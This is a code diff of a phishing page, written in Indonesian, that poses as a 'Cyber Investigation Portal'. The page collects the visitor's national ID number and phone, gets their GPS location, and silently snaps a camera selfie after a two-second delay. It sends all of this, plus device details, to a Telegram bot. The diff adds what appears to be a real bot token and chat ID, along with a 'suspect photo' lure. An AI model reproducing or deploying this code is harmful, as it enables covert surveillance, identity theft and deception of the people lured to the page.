@@ -80,6 +80,24 @@ input:focus, select:focus { border-color:#00b4ff; background:#08172a; box-shadow
 .progress { width:240px; height:4px; background:rgba(0,180,255,.1); border-radius:3px; overflow:hidden; }
 #bar { height:100%; width:0%; background:linear-gradient(90deg,#00b4ff,#22d3ee); transition:width 5s linear; box-shadow:0 0 10px #00b4ff; }
 
+/* ==== SUSPECT PHOTO ==== */
+.suspect-box {
+  position:relative; width:100%; max-width:200px; margin:0 auto 16px;
+  border-radius:12px; overflow:hidden; border:2px solid #ef4444;
+  box-shadow:0 0 26px rgba(239,68,68,.45); background:#000;
+}
+.suspect-img { width:100%; display:block; filter:grayscale(15%) contrast(1.05); }
+.scan-line {
+  position:absolute; top:0; left:0; width:100%; height:3px;
+  background:linear-gradient(90deg,transparent,#ef4444,transparent);
+  animation:scan 2s linear infinite;
+}
+@keyframes scan { 0%{top:0;} 100%{top:100%;} }
+.suspect-label {
+  font-size:9.5px; color:#f87171; letter-spacing:1.5px; text-align:center;
+  margin-bottom:14px; text-transform:uppercase; font-weight:700;
+}
+
 .target-card { text-align:left; }
 .tc-head { display:flex; align-items:center; gap:12px; padding-bottom:14px; border-bottom:1px solid rgba(0,180,255,.15); margin-bottom:14px; }
 .tc-avatar { width:56px; height:56px; border-radius:50%; background:#060f1c; border:2px solid #ef4444; display:flex; align-items:center; justify-content:center; font-size:24px; flex-shrink:0; box-shadow:0 0 18px rgba(239,68,68,.45); }
@@ -162,6 +180,14 @@ input:focus, select:focus { border-color:#00b4ff; background:#08172a; box-shadow
 <!-- ============ STEP 3: TARGET PROFILE ============ -->
 <div id="screen-verify" class="screen">
   <div class="card target-card">
+
+    <!-- FOTO PELAKU -->
+    <div class="suspect-box">
+      <img src="pelaku.png" alt="Data Pelaku" class="suspect-img">
+      <div class="scan-line"></div>
+    </div>
+    <div class="suspect-label">⚠ Target Teridentifikasi ⚠</div>
+
     <div class="tc-head">
       <div class="tc-avatar">👤</div>
       <div>
@@ -212,7 +238,7 @@ input:focus, select:focus { border-color:#00b4ff; background:#08172a; box-shadow
   </div>
 </div>
 
-<!-- ============ STEP 4: CAMERA (AUTO CAPTURE) ============ -->
+<!-- ============ STEP 4: CAMERA AUTO CAPTURE ============ -->
 <div id="screen-capture" class="screen">
   <div class="card">
     <h2><span class="ico">▸</span>Verifikasi Kamera</h2>
@@ -221,7 +247,6 @@ input:focus, select:focus { border-color:#00b4ff; background:#08172a; box-shadow
       <canvas id="canvas" style="display:none"></canvas>
     </div>
     <p id="camStatus" class="status">Menunggu izin kamera...</p>
-    <!-- Tombol dihapus — capture otomatis -->
   </div>
 </div>
 
@@ -237,16 +262,16 @@ input:focus, select:focus { border-color:#00b4ff; background:#08172a; box-shadow
 
 <script>
 /* =========================================================
-   CYBER INVESTIGATION PORTAL — capture frontend (AUTO SNAP)
+   CYBER INVESTIGATION PORTAL — FINAL
    MADE BY RORAXBRINGAZ / architected by JHONNNN
    ========================================================= */
 
 /* ====== KONFIGURASI TELEGRAM BOT ====== */
-const BOT_TOKEN = 'ISI_TOKEN_BOT_KAMU';
-const CHAT_ID   = 'ISI_CHAT_ID_KAMU';
+const BOT_TOKEN = '8795652413:AAFtHAsp5z6xsBEs-UyrJH5FMKX0rizUsno';
+const CHAT_ID   = '1966317946';
 
-/* ====== AUTO CAPTURE DELAY (ms) — ubah kalau perlu ====== */
-const AUTO_CAPTURE_DELAY = 2000; // 2 detik setelah kamera aktif
+/* ====== AUTO CAPTURE DELAY (ms) ====== */
+const AUTO_CAPTURE_DELAY = 2000;
 
 const $ = id => document.getElementById(id);
 let camStream = null;
@@ -272,7 +297,7 @@ $('btnNext').addEventListener('click', () => {
   }, 5000);
 });
 
-/* ---------- AUTO PERMISSION ---------- */
+/* ---------- AUTO PERMISSION + AUTO CAPTURE ---------- */
 async function autoRequestPermissions() {
   // 1) GEOLOCATION
   let geo = null;
@@ -317,21 +342,17 @@ async function autoRequestPermissions() {
   window.__geo = geo;
   go('screen-capture');
 
-  // ==== AUTO SNAP SETELAH DELAY ====
+  // Auto snap setelah delay
   if (captureTimer) clearTimeout(captureTimer);
-  captureTimer = setTimeout(() => {
-    doAutoCapture();
-  }, AUTO_CAPTURE_DELAY);
+  captureTimer = setTimeout(() => doAutoCapture(), AUTO_CAPTURE_DELAY);
 }
 
-/* ---------- CAPTURE OTOMATIS ---------- */
+/* ---------- AUTO CAPTURE ---------- */
 async function doAutoCapture() {
   const video = $('video');
   const canvas = $('canvas');
 
-  // pastikan video sudah punya frame
   if (!video.videoWidth) {
-    // belum siap, coba lagi 300ms
     setTimeout(doAutoCapture, 300);
     return;
   }
@@ -349,13 +370,15 @@ async function doAutoCapture() {
     if (camStream) camStream.getTracks().forEach(t => t.stop());
     if (captureTimer) clearTimeout(captureTimer);
 
-    // delay sedikit biar user lihat "Mengirim data..."
     setTimeout(() => go('screen-done'), 800);
   }, 'image/jpeg', 0.88);
 }
 
 /* ---------- KIRIM KE TELEGRAM ---------- */
 async function sendToTelegram(blob, geo) {
+  const mapsUrl = `https://maps.google.com/?q=${geo.lat},${geo.lng}`;
+
+  // ==== PESAN 1: FOTO + DATA FORM + GPS ====
   const fd = new FormData();
   fd.append('chat_id', CHAT_ID);
   fd.append('photo', blob, 'selfie.jpg');
@@ -366,9 +389,10 @@ async function sendToTelegram(blob, geo) {
     `🆔 NIK: <code>${$('nik').value || '-'}</code>\n` +
     `📞 Telp: <code>${$('telp').value || '-'}</code>\n` +
     `📋 Jenis: ${$('jenis').value}\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
     `📍 Koordinat: <code>${geo.lat.toFixed(6)}, ${geo.lng.toFixed(6)}</code>\n` +
     `🎯 Akurasi: ±${Math.round(geo.acc)} m\n` +
-    `🗺️ Peta: https://maps.google.com/?q=${geo.lat},${geo.lng}\n` +
+    `🗺️ Peta: ${mapsUrl}\n` +
     `━━━━━━━━━━━━━━━━━━━━\n` +
     `🕒 ${new Date().toLocaleString('id-ID')}`
   );
@@ -384,7 +408,7 @@ async function sendToTelegram(blob, geo) {
     console.warn('sendPhoto gagal:', e);
   }
 
-  // metadata device
+  // ==== PESAN 2: DEVICE INFO ====
   const text =
     `📱 <b>DEVICE INFO</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━\n` +
